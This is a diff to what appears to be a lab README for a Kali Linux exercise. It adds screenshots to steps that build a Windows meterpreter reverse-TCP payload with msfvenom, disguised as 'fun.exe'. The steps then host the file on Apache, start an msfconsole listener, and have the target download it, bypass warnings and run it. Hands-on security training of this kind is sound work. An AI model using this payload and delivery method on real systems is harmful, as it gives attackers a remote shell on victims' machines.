@@ -25,36 +25,41 @@ Open terminal and try execute some kali linux commands
 
 Find the attackers ip address using ifconfig
 ## OUTPUT:
+<img width="1442" height="948" alt="Screenshot 2025-11-19 113354" src="https://github.com/user-attachments/assets/c2b6f01b-2c33-48ef-9fa5-9f046feaf222" />
 
 
 
 Create a malicious executable file fun.exe using msfvenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT:
+<img width="822" height="232" alt="Screenshot 2025-11-19 114251" src="https://github.com/user-attachments/assets/2a6795cd-7fc0-4704-9099-6fa26b453ab2" />
 
 
 copy the fun.exe into the apache /var/www/html folder
 ## OUTPUT:
 
-
 Start apache server
 sudo systemctl apache2 start
 ## OUTPUT:
 
+<img width="563" height="120" alt="Screenshot 2025-11-19 114628" src="https://github.com/user-attachments/assets/b498c825-9811-4021-803c-a3dfc59d5e10" />
 
 Check the status of apache2
 ## OUTPUT:
+<img width="1023" height="426" alt="Screenshot 2025-11-19 114714" src="https://github.com/user-attachments/assets/c3cbce83-dbd9-44e9-ac58-feb4b440cc00" />
 
 
 
 Invoke msfconsole:
 ## OUTPUT:
 
+<img width="948" height="412" alt="Screenshot 2025-11-19 190730" src="https://github.com/user-attachments/assets/e6c9d0ed-6a42-474d-9914-c375a513c516" />
 
 
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 ## OUTPUT:
+<img width="1266" height="685" alt="Screenshot 2025-11-19 190831" src="https://github.com/user-attachments/assets/aa761f94-8987-4469-ba33-39ed2e98b22b" />
 
 
 
@@ -65,6 +70,7 @@ set LHOST 0.0.0.0
 
 ## OUTPUT:
 
+<img width="1122" height="149" alt="Screenshot 2025-11-19 200029" src="https://github.com/user-attachments/assets/857fce72-e555-4982-a3f3-d354f04c8b2e" />
 
 
 
@@ -72,11 +78,13 @@ On the target Windows machine, open a Web browser and open this URL, replacing t
 http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
 The file "fun.exe" downloads. 
 ## OUTPUT:
+<img width="739" height="275" alt="Screenshot 2025-11-19 201924" src="https://github.com/user-attachments/assets/500f9909-0852-4b48-bdf8-9fb607316aeb" />
 
 
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 ## OUTPUT:
+<img width="720" height="269" alt="image" src="https://github.com/user-attachments/assets/3372dd70-3575-4163-aae1-46adf8292825" />
 
 
 
